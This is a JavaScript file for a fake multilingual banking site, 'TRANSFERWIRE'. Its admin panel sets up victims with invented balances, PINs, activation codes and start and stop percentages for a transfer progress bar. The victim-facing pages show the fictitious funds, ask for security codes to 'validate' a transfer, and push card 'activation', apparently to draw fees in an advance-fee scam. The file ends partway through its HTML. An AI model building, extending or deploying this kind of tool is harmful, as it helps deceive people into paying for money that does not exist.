// ==========================================
// BASE DE DONNÉES LOCALE
// ==========================================
const DB = {
    getClients: () => JSON.parse(localStorage.getItem('tw_clients') || '{}'),
    saveClients: (clients) => localStorage.setItem('tw_clients', JSON.stringify(clients)),
    getActiveClientId: () => localStorage.getItem('tw_active_client'),
    setActiveClient: (id) => localStorage.setItem('tw_active_client', id),
    clearActiveClient: () => localStorage.removeItem('tw_active_client')
};

// ==========================================
// DICTIONNAIRE DE TRADUCTIONS COMPLET
// ==========================================
const i18n = {
    pl: {
        loginTitle: "Zaloguj się na swoje konto", emailPh: "Twój adres e-mail", pinPh: "Twój kod dostępu", loginBtn: "Zaloguj się", loginErr: "Nieprawidłowy adres e-mail lub kod PIN.",
        greeting: "Witam", balanceLabel: "Saldo konta :", makeTransferBtn: "Zrób przelew", myCardBtn: "Moja karta", transactionHistory: "Historia transakcji", noTransactions: "Brak historii transakcji.",
        sendOutgoingTransfer: "Wyślij przelew wychodzący", transferDetails: "Szczegóły przelewu", ibanPh: "Wpisz IBAN/Numer konta", swiftPh: "Kod banku (BIC/SWIFT)", bankPh: "Nazwa banku", beneficiaryPh: "Nazwa beneficjenta", reasonPh: "Powód przeniesienia", processingWarning: "Realizacja przelewu w ciągu 1-2 dni roboczych. Opłaty: bezpłatne", nextBtn: "Następny",
        transferSummary: "Podsumowanie transferu", transferAmountLabel: "Kwota przelewu:", ibanLabel: "IBAN/numer", ibanLabelLine2: "konta:", swiftLabel: "Kod banku (BIC/SWIFT):", bankLabel: "Bank odbiorczy:", beneficiaryLabel: "Nazwa beneficjenta:", reasonLabel: "Powód przeniesienia:", identityVerification: "Weryfikacja tożsamości", verificationDesc: "Wprowadź otrzymany kod zabezpieczający, aby zatwierdzić przelew na Twoje konto bankowe :", securityCodePh: "Wprowadź kod zabezpieczający", sendBtn: "Wyślij",
        wellDone: "Dobrze zrobiony!", processingDesc: "Weryfikacja tożsamości zakończona pomyślnie. Przed aktualizacją tej strony poczekaj, aż środki zostaną przelane do Twojego banku.", amountToReceive: "Kwota do otrzymania:", processingText: "Transfer w toku, proszę czekać...",
        cardWelcome: "Gratulacje, Twoja karta debetowa jest dostępna. Przed każdym użyciem należy aktywować kartę, aby przyspieszyć transfer środków zasilonych na koncie.", activateCardBtn: "Aktywuj moją kartę", blockCardBtn: "Zablokuj moją kartę", cardTransactions: "Transakcje kartowe", validUntil: "WAŻNE DO:",
        personalData: "Dane osobowe", accountOwner: "Właściciel konta:", emailLabel: "Adres e-mail:", phoneLabel: "Numer telefonu:", countryLabel: "Kraj zamieszkania:", addressLabel: "Adres zamieszkania:", accountAndTransfer: "Konto i przelew", balanceProfile: "Saldo konta:", accountType: "Typ konta:", accountStatus: "Stan konta:", statusActive: "Aktywny", supportedTransfer: "Obsługiwany transfer:", beneficiaryIban: "IBAN beneficjenta:", accountTypeValue: "Profesjonalny", transferTypeValue: "Klasyczny", profileBanner: "Aby zaktualizować informacje o swoim koncie, skontaktuj się z naszym zespołem wsparcia.", logoutBtn: "Rozłącz",
        modalSuccess: "Przeniesienie {amount} wysłane pomyślnie", modalFailure: "Transfer nie powiódł się", sendTime: "Wyślij czas:", closeBtn: "Zamknij", navBalance: "Równowaga", navCard: "Moja karta", navTransfer: "Przeniesienie", navAccount: "Moje konto", txTransferSent: "Przelew wysłany", txTransferReceived: "Przelew otrzymany", txRefundReceived: "Otrzymano zwrot pieniędzy"
    },
    fr: {
        loginTitle: "Connectez-vous à votre compte", emailPh: "Votre adresse e-mail", pinPh: "Votre code d'accès", loginBtn: "Se connecter", loginErr: "Adresse e-mail ou code PIN incorrect.",
        greeting: "Bonjour", balanceLabel: "Solde du compte :", makeTransferBtn: "Faire un virement", myCardBtn: "Ma carte", transactionHistory: "Historique des transactions", noTransactions: "Aucun historique de transaction.",
        sendOutgoingTransfer: "Envoyer un virement sortant", transferDetails: "Détails du virement", ibanPh: "Entrez l'IBAN/Numéro de compte", swiftPh: "Code banque (BIC/SWIFT)", bankPh: "Nom de la banque", beneficiaryPh: "Nom du bénéficiaire", reasonPh: "Motif du virement", processingWarning: "Réalisation du virement sous 1 à 2 jours ouvrables. Frais : gratuits", nextBtn: "Suivant",
        transferSummary: "Récapitulatif du virement", transferAmountLabel: "Montant du virement :", ibanLabel: "IBAN/numéro", ibanLabelLine2: "de compte :", swiftLabel: "Code banque (BIC/SWIFT) :", bankLabel: "Banque destinataire :", beneficiaryLabel: "Nom du bénéficiaire :", reasonLabel: "Motif du virement :", identityVerification: "Vérification d'identité", verificationDesc: "Saisissez le code de sécurité reçu pour valider le virement vers votre compte bancaire :", securityCodePh: "Entrez le code de sécurité", sendBtn: "Envoyer",
        wellDone: "Bien joué !", processingDesc: "Vérification d'identité réussie. Avant de mettre à jour cette page, attendez que les fonds soient transférés vers votre banque.", amountToReceive: "Montant à recevoir :", processingText: "Virement en cours, veuillez patienter...",
        cardWelcome: "Félicitations, votre carte de débit est disponible. Avant chaque utilisation, il est nécessaire d'activer la carte pour accélérer le transfert des fonds.", activateCardBtn: "Activer ma carte", blockCardBtn: "Bloquer ma carte", cardTransactions: "Transactions par carte", validUntil: "VALABLE JUSQU'AU :",
        personalData: "Données personnelles", accountOwner: "Titulaire du compte :", emailLabel: "Adresse e-mail :", phoneLabel: "Numéro de téléphone :", countryLabel: "Pays de résidence :", addressLabel: "Adresse de résidence :", accountAndTransfer: "Compte et virement", balanceProfile: "Solde du compte :", accountType: "Type de compte :", accountStatus: "Statut du compte :", statusActive: "Actif", supportedTransfer: "Virement supporté :", beneficiaryIban: "IBAN du bénéficiaire :", accountTypeValue: "Professionnel", transferTypeValue: "Classique", profileBanner: "Pour mettre à jour les informations de votre compte, veuillez contacter notre équipe d'assistance.", logoutBtn: "Se déconnecter",
        modalSuccess: "Virement de {amount} envoyé avec succès", modalFailure: "Échec du transfert", sendTime: "Heure d'envoi :", closeBtn: "Fermer", navBalance: "Solde", navCard: "Ma carte", navTransfer: "Virement", navAccount: "Mon compte", txTransferSent: "Virement envoyé", txTransferReceived: "Virement reçu", txRefundReceived: "Remboursement reçu"
    },
    es: {
        loginTitle: "Inicia sesión en tu cuenta", emailPh: "Tu correo electrónico", pinPh: "Tu código de acceso", loginBtn: "Iniciar sesión", loginErr: "Correo electrónico o código PIN incorrecto.",
        greeting: "Hola", balanceLabel: "Saldo de la cuenta :", makeTransferBtn: "Hacer una transferencia", myCardBtn: "Mi tarjeta", transactionHistory: "Historial de transacciones", noTransactions: "Sin historial de transacciones.",
        sendOutgoingTransfer: "Enviar transferencia saliente", transferDetails: "Detalles de la transferencia", ibanPh: "Ingrese el IBAN/Número de cuenta", swiftPh: "Código del banco (BIC/SWIFT)", bankPh: "Nombre del banco", beneficiaryPh: "Nombre del beneficiario", reasonPh: "Motivo de la transferencia", processingWarning: "Realización de la transferencia en 1-2 días hábiles. Comisiones: gratuitas", nextBtn: "Siguiente",
        transferSummary: "Resumen de la transferencia", transferAmountLabel: "Importe de la transferencia:", ibanLabel: "IBAN/número", ibanLabelLine2: "de cuenta:", swiftLabel: "Código del banco (BIC/SWIFT):", bankLabel: "Banco receptor:", beneficiaryLabel: "Nombre del beneficiario:", reasonLabel: "Motivo de la transferencia:", identityVerification: "Verificación de identidad", verificationDesc: "Introduzca el código de seguridad recibido para validar la transferencia a su cuenta bancaria :", securityCodePh: "Introduzca el código de seguridad", sendBtn: "Enviar",
        wellDone: "¡Bien hecho!", processingDesc: "Verificación de identidad exitosa. Antes de actualizar esta página, espere a que los fondos se transfieran a su banco.", amountToReceive: "Importe a recibir:", processingText: "Transferencia en curso, por favor espere...",
        cardWelcome: "Felicidades, su tarjeta de débito está disponible. Antes de cada uso, es necesario activar la tarjeta para acelerar la transferencia de fondos.", activateCardBtn: "Activar mi tarjeta", blockCardBtn: "Bloquear mi tarjeta", cardTransactions: "Transacciones con tarjeta", validUntil: "VÁLIDA HASTA:",
        personalData: "Datos personales", accountOwner: "Titular de la cuenta:", emailLabel: "Correo electrónico:", phoneLabel: "Número de teléfono:", countryLabel: "País de residencia:", addressLabel: "Dirección de residencia:", accountAndTransfer: "Cuenta y transferencia", balanceProfile: "Saldo de la cuenta:", accountType: "Tipo de cuenta:", accountStatus: "Estado de la cuenta:", statusActive: "Activo", supportedTransfer: "Transferencia soportada:", beneficiaryIban: "IBAN del beneficiario:", accountTypeValue: "Profesional", transferTypeValue: "Clásico", profileBanner: "Para actualizar la información de su cuenta, contacte con nuestro equipo de soporte.", logoutBtn: "Cerrar sesión",
        modalSuccess: "Transferencia de {amount} enviada con éxito", modalFailure: "Transferencia fallida", sendTime: "Hora de envío:", closeBtn: "Cerrar", navBalance: "Saldo", navCard: "Mi tarjeta", navTransfer: "Transferencia", navAccount: "Mi cuenta", txTransferSent: "Transferencia enviada", txTransferReceived: "Transferencia recibida", txRefundReceived: "Reembolso recibido"
    },
    it: {
        loginTitle: "Accedi al tuo account", emailPh: "La tua email", pinPh: "Il tuo codice di accesso", loginBtn: "Accedi", loginErr: "Email o codice PIN errato.",
        greeting: "Ciao", balanceLabel: "Saldo del conto :", makeTransferBtn: "Fai un bonifico", myCardBtn: "La mia carta", transactionHistory: "Cronologia transazioni", noTransactions: "Nessuna cronologia transazioni.",
        sendOutgoingTransfer: "Invia bonifico in uscita", transferDetails: "Dettagli del bonifico", ibanPh: "Inserisci IBAN/Numero di conto", swiftPh: "Codice bancario (BIC/SWIFT)", bankPh: "Nome della banca", beneficiaryPh: "Nome del beneficiario", reasonPh: "Motivo del bonifico", processingWarning: "Esecuzione del bonifico entro 1-2 giorni lavorativi. Commissioni: gratuite", nextBtn: "Avanti",
        transferSummary: "Riepilogo del bonifico", transferAmountLabel: "Importo del bonifico:", ibanLabel: "IBAN/numero", ibanLabelLine2: "di conto:", swiftLabel: "Codice bancario (BIC/SWIFT):", bankLabel: "Banca destinataria:", beneficiaryLabel: "Nome del beneficiario:", reasonLabel: "Motivo del bonifico:", identityVerification: "Verifica dell'identità", verificationDesc: "Inserisci il codice di sicurezza ricevuto per convalidare il bonifico sul tuo conto bancario :", securityCodePh: "Inserisci il codice di sicurezza", sendBtn: "Invia",
        wellDone: "Ben fatto!", processingDesc: "Verifica dell'identità riuscita. Prima di aggiornare questa pagina, attendi che i fondi siano trasferiti alla tua banca.", amountToReceive: "Importo da ricevere:", processingText: "Bonifico in corso, attendere prego...",
        cardWelcome: "Congratulazioni, la tua carta di debito è disponibile. Prima di ogni utilizzo è necessario attivare la carta per accelerare il trasferimento dei fondi.", activateCardBtn: "Attiva la mia carta", blockCardBtn: "Blocca la mia carta", cardTransactions: "Transazioni con carta", validUntil: "VALIDA FINO AL:",
        personalData: "Dati personali", accountOwner: "Titolare del conto:", emailLabel: "Indirizzo e-mail:", phoneLabel: "Numero di telefono:", countryLabel: "Paese di residenza:", addressLabel: "Indirizzo di residenza:", accountAndTransfer: "Conto e bonifico", balanceProfile: "Saldo del conto:", accountType: "Tipo di conto:", accountStatus: "Stato del conto:", statusActive: "Attivo", supportedTransfer: "Bonifico supportato:", beneficiaryIban: "IBAN del beneficiario:", accountTypeValue: "Professionale", transferTypeValue: "Classico", profileBanner: "Per aggiornare le informazioni del tuo conto, contatta il nostro team di supporto.", logoutBtn: "Disconnetti",
        modalSuccess: "Bonifico di {amount} inviato con successo", modalFailure: "Bonifico fallito", sendTime: "Ora di invio:", closeBtn: "Chiudi", navBalance: "Saldo", navCard: "La mia carta", navTransfer: "Bonifico", navAccount: "Il mio conto", txTransferSent: "Bonifico inviato", txTransferReceived: "Bonifico ricevuto", txRefundReceived: "Rimborso ricevuto"
    },
    de: {
        loginTitle: "Melden Sie sich bei Ihrem Konto an", emailPh: "Ihre E-Mail-Adresse", pinPh: "Ihr Zugangscode", loginBtn: "Anmelden", loginErr: "Falsche E-Mail-Adresse oder PIN-Code.",
        greeting: "Hallo", balanceLabel: "Kontostand :", makeTransferBtn: "Überweisung tätigen", myCardBtn: "Meine Karte", transactionHistory: "Transaktionsverlauf", noTransactions: "Kein Transaktionsverlauf.",
        sendOutgoingTransfer: "Ausgehende Überweisung senden", transferDetails: "Überweisungsdetails", ibanPh: "IBAN/Kontonummer eingeben", swiftPh: "Bankcode (BIC/SWIFT)", bankPh: "Name der Bank", beneficiaryPh: "Name des Begünstigten", reasonPh: "Überweisungsgrund", processingWarning: "Ausführung der Überweisung innerhalb von 1-2 Werktagen. Gebühren: kostenlos", nextBtn: "Weiter",
        transferSummary: "Überweisungsübersicht", transferAmountLabel: "Überweisungsbetrag:", ibanLabel: "IBAN/Nummer", ibanLabelLine2: "des Kontos:", swiftLabel: "Bankcode (BIC/SWIFT):", bankLabel: "Empfängerbank:", beneficiaryLabel: "Name des Begünstigten:", reasonLabel: "Überweisungsgrund:", identityVerification: "Identitätsprüfung", verificationDesc: "Geben Sie den erhaltenen Sicherheitscode ein, um die Überweisung auf Ihr Bankkonto zu bestätigen :", securityCodePh: "Sicherheitscode eingeben", sendBtn: "Senden",
        wellDone: "Gut gemacht!", processingDesc: "Identitätsprüfung erfolgreich. Bevor Sie diese Seite aktualisieren, warten Sie, bis die Mittel an Ihre Bank überwiesen wurden.", amountToReceive: "Zu erhaltender Betrag:", processingText: "Überweisung in Bearbeitung, bitte warten...",
        cardWelcome: "Herzlichen Glückwunsch, Ihre Debitkarte ist verfügbar. Vor jeder Verwendung muss die Karte aktiviert werden, um die Überweisung der Mittel zu beschleunigen.", activateCardBtn: "Meine Karte aktivieren", blockCardBtn: "Meine Karte sperren", cardTransactions: "Kartentransaktionen", validUntil: "GÜLTIG BIS:",
        personalData: "Persönliche Daten", accountOwner: "Kontoinhaber:", emailLabel: "E-Mail-Adresse:", phoneLabel: "Telefonnummer:", countryLabel: "Wohnsitzland:", addressLabel: "Wohnadresse:", accountAndTransfer: "Konto und Überweisung", balanceProfile: "Kontostand:", accountType: "Kontotyp:", accountStatus: "Kontostatus:", statusActive: "Aktiv", supportedTransfer: "Unterstützte Überweisung:", beneficiaryIban: "IBAN des Begünstigten:", accountTypeValue: "Professionell", transferTypeValue: "Klassisch", profileBanner: "Um die Informationen Ihres Kontos zu aktualisieren, kontaktieren Sie bitte unser Support-Team.", logoutBtn: "Abmelden",
        modalSuccess: "Überweisung von {amount} erfolgreich gesendet", modalFailure: "Überweisung fehlgeschlagen", sendTime: "Sendezeit:", closeBtn: "Schließen", navBalance: "Kontostand", navCard: "Meine Karte", navTransfer: "Überweisung", navAccount: "Mein Konto", txTransferSent: "Überweisung gesendet", txTransferReceived: "Überweisung erhalten", txRefundReceived: "Rückerstattung erhalten"
    }
};

let currentLang = 'fr';
function t(key) {
    const dict = i18n[currentLang] || i18n['fr'];
    return dict[key] !== undefined ? dict[key] : (i18n['fr'][key] || key);
}

function formatAmount(amount, currency) {
    return amount.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' ' + currency;
}

// ==========================================
// GÉNÉRATION D'UN ID COURT ET UNIQUE
// ==========================================
function generateShortId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// ==========================================
// ROUTEUR
// ==========================================
function router() {
    const urlParams = new URLSearchParams(window.location.search);
    const clientId = urlParams.get('id');
    const activeClientId = DB.getActiveClientId();
    const root = document.getElementById('app-root');
    
    if (clientId) {
        const clients = DB.getClients();
        const client = clients[clientId];
        
        if (client) {
            currentLang = client.language || 'fr';
            if (activeClientId === clientId) {
                renderBankingApp(client);
            } else {
                renderLoginPage(client);
            }
        } else {
            root.innerHTML = `<div style="padding: 40px; text-align: center; color: #dc3545; font-weight: 700;">Erreur : Client introuvable ou lien invalide.</div>`;
        }
    } else {
        renderAdminPage();
    }
}

// ==========================================
// VUE 1 : PAGE ADMIN PROFESSIONNELLE
// ==========================================
function renderAdminPage() {
    const root = document.getElementById('app-root');
    const clients = DB.getClients();
    
    let clientsHtml = `
        <div class="empty-state">
            <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm-7 13c0-2.33 4.67-3.5 7-3.5s7 1.17 7 3.5v1H5v-1z"/></svg>
            <div>Aucun client créé pour le moment.</div>
        </div>
    `;
    
    if (Object.keys(clients).length > 0) {
        clientsHtml = '';
        const sortedIds = Object.keys(clients).sort((a, b) => b.localeCompare(a));
        const langNames = { pl: 'Polonais', fr: 'Français', es: 'Espagnol', it: 'Italien', de: 'Allemand' };
        
        sortedIds.forEach(id => {
            const c = clients[id];
            const baseUrl = window.location.origin + window.location.pathname;
            const link = `${baseUrl}?id=${id}`;
            clientsHtml += `
                <div class="client-card">
                    <div class="client-card-header">
                        <div class="client-card-name">${c.firstName} ${c.lastName}</div>
                        <div class="client-card-lang">${langNames[c.language] || c.language}</div>
                    </div>
                    <div class="client-card-info"><strong>Email :</strong> ${c.email}</div>
                    <div class="client-card-info"><strong>Téléphone :</strong> ${c.phone}</div>
                    <div class="client-card-pin">PIN : ${c.pin}</div>
                    <div class="client-card-link">
                        <svg viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
                        <a href="${link}" target="_blank">${link}</a>
                        <button class="btn-copy-link" onclick="copyToClipboard('${link}')">Copier</button>
                    </div>
                </div>
            `;
        });
    }

    root.innerHTML = `
        <div class="view active">
            <div class="admin-wrapper">
                <div class="admin-topbar">
                    <div class="brand">
                        <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>
                        TRANSFERWIRE
                    </div>
                    <div class="admin-badge">Admin Panel</div>
                </div>
                <div class="admin-body">
                    <form class="admin-form" id="admin-form">
                        <div class="admin-section">
                            <div class="admin-section-title">
                                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                                Informations sur le client
                            </div>
                            <div class="admin-grid">
                                <div class="admin-group"><label>Nom <span class="req">*</span></label><input type="text" id="lastName" required></div>
                                <div class="admin-group"><label>Prénom <span class="req">*</span></label><input type="text" id="firstName" required></div>
                                <div class="admin-group"><label>Pays <span class="req">*</span></label>
                                    <select id="country">
                                        <option value="France">🇫🇷 France</option>
                                        <option value="Pologne">🇵🇱 Pologne</option>
                                        <option value="Espagne">🇪🇸 Espagne</option>
                                        <option value="Italie">🇮🇹 Italie</option>
                                        <option value="Allemagne">🇩🇪 Allemagne</option>
                                    </select>
                                </div>
                                <div class="admin-group"><label>Téléphone <span class="req">*</span></label><input type="tel" id="phone" required></div>
                                <div class="admin-group"><label>Email <span class="req">*</span></label><input type="email" id="email" required></div>
                                <div class="admin-group"><label>Langue <span class="req">*</span></label>
                                    <select id="language">
                                        <option value="pl">Polonais</option>
                                        <option value="fr" selected>Français</option>
                                        <option value="es">Espagnol</option>
                                        <option value="it">Italien</option>
                                        <option value="de">Allemand</option>
                                    </select>
                                </div>
                                <div class="admin-group full-width"><label>Adresse complète <span class="req">*</span></label><input type="text" id="address" required></div>
                            </div>
                        </div>

                        <div class="admin-section">
                            <div class="admin-section-title">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"/></svg>
                                Solde et virement
                            </div>
                            <div class="admin-grid">
                                <div class="admin-group full-width"><label>Banque émettrice (facultatif)</label><input type="text" id="bankName" placeholder="Nom de la banque"></div>
                                <div class="admin-group"><label>Solde à créditer <span class="req">*</span></label><input type="number" id="balance" step="0.01" placeholder="Ex: 5000" required></div>
                                <div class="admin-group"><label>Devise <span class="req">*</span></label>
                                    <select id="currency">
                                        <option value="€">€ (Euro)</option>
                                        <option value="$">$ (Dollar)</option>
                                        <option value="£">£ (Livre)</option>
                                        <option value="zł">zł (Zloty)</option>
                                    </select>
                                </div>
                                <div class="admin-group"><label>Pourcentage départ <span class="req">*</span></label><input type="number" id="startPercent" min="0" max="100" value="0" required></div>
                                <div class="admin-group"><label>Pourcentage arrêt <span class="req">*</span></label><input type="number" id="stopPercent" min="0" max="100" value="100" required></div>
                                <div class="admin-group"><label>Code PIN <span class="req">*</span></label><input type="text" id="pin" placeholder="Ex: 1234" required></div>
                                <div class="admin-group"><label>Code d'activation <span class="req">*</span></label><input type="text" id="activationCode" placeholder="Ex: 987654" required></div>
                                <div class="admin-group full-width"><label>Message de fin <span class="req">*</span></label><textarea id="message" rows="3" placeholder="Message affiché à la fin du virement..." required></textarea></div>
                            </div>
                            <button type="submit" class="btn-admin-submit">
                                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                                Créer le client
                            </button>
                        </div>
                    </form>
                    
                    <div class="client-list-title">Clients créés</div>
                    <div class="client-list">${clientsHtml}</div>
                </div>
            </div>
        </div>
    `;

    document.getElementById('admin-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const clients = DB.getClients();
        
        let clientId;
        do {
            clientId = generateShortId();
        } while (clients[clientId]);
        
        clients[clientId] = {
            id: clientId,
            lastName: document.getElementById('lastName').value,
            firstName: document.getElementById('firstName').value,
            country: document.getElementById('country').value,
            phone: document.getElementById('phone').value,
            email: document.getElementById('email').value,
            address: document.getElementById('address').value,
            language: document.getElementById('language').value,
            bankName: document.getElementById('bankName').value,
            balance: parseFloat(document.getElementById('balance').value),
            currency: document.getElementById('currency').value,
            startPercent: parseInt(document.getElementById('startPercent').value),
            stopPercent: parseInt(document.getElementById('stopPercent').value),
            pin: document.getElementById('pin').value,
            activationCode: document.getElementById('activationCode').value,
            message: document.getElementById('message').value,
            transactions: []
        };
        
        DB.saveClients(clients);
        renderAdminPage();
    });
}

// Fonction pour copier le lien dans le presse-papiers
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Lien copié dans le presse-papiers !');
    }).catch(err => {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('Lien copié dans le presse-papiers !');
    });
}

// ==========================================
// VUE 2 : PAGE DE CONNEXION
// ==========================================
function renderLoginPage(client) {
    currentLang = client.language || 'fr';
    const root = document.getElementById('app-root');

    root.innerHTML = `
        <div class="view active" id="view-login">
            <div class="login-container">
                <div class="login-logo">
                    <svg viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>
                    <span>TRANSFERWIRE</span>
                </div>
                <div class="login-title">${t('loginTitle')}</div>
                <div class="user-badge">
                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                    <span>${client.firstName.toUpperCase()} ${client.lastName.toUpperCase()}</span>
                </div>
                <form id="login-form" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                    <div class="login-input-group">
                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
                        <input type="email" id="email" placeholder="${t('emailPh')}" required>
                    </div>
                    <div class="login-input-group">
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                        <input type="password" id="pin" placeholder="${t('pinPh')}" required>
                    </div>
                    <button type="submit" class="btn-login">
                        ${t('loginBtn')}
                        <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                    </button>
                    <div class="error-msg" id="error-msg">${t('loginErr')}</div>
                </form>
            </div>
        </div>
    `;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const pin = document.getElementById('pin').value;

        if (email === client.email && pin === client.pin) {
            DB.setActiveClient(client.id);
            router();
        } else {
            document.getElementById('error-msg').style.display = 'block';
        }
    });
}

// ==========================================
// VUE 3 : APPLICATION BANCAIRE TRADUITE
// ==========================================
let currentClient = null;
let progressInterval = null;

function renderBankingApp(client) {
    currentClient = client;
    currentLang = client.language || 'fr';
    const root = document.getElementById('app-root');
    const currency = client.currency || '€';
    const balanceFormatted = formatAmount(client.balance, currency);

    root.innerHTML = `
        <div class="view active" style="display: flex; flex-direction: column; height: 100%;">
            <header class="app-header">
                <button class="icon-button menu-icon" onclick="DB.clearActiveClient(); router();">
                    <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
                </button>
                <div class="header-title">TRANSFERWIRE</div>
                <button class="icon-button" onclick="navigateTo('screen-profile')">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                </button>
            </header>

            <div class="screens-container">
                <!-- DASHBOARD -->
                <div id="screen-dashboard" class="screen active">
                    <div class="greeting">${t('greeting')} ${client.firstName} ${client.lastName} ,</div>
                    <div class="balance-card">
                        <div class="balance-header">
                            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"/></svg>
                            ${t('balanceLabel')}
                        </div>
                        <div class="balance-amount" id="display-balance">${balanceFormatted}</div>
                        <div class="balance-actions">
                            <button class="btn btn-yellow" onclick="navigateTo('screen-transfer')">
                                ${t('makeTransferBtn')}
                                <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                            </button>
                            <button class="btn btn-green" onclick="navigateTo('screen-card')">
                                ${t('myCardBtn')}
                                <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                            </button>
                        </div>
                    </div>

                    <div class="section-title">${t('transactionHistory')}</div>
                    <div class="transaction-list" id="transaction-list">
                        ${renderTransactions(client.transactions)}
                    </div>
                </div>

                <!-- TRANSFERT FORMULAIRE -->
                <div id="screen-transfer" class="screen">
                    <div class="page-title-bar">
                        <div class="page-title-icon"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></div>
                        <span>${t('sendOutgoingTransfer')}</span>
                    </div>
                    <div class="transfer-amount" id="transfer-display-amount">${balanceFormatted}</div>
                    
                    <div class="details-header">
                        <div class="details-icon">i</div>
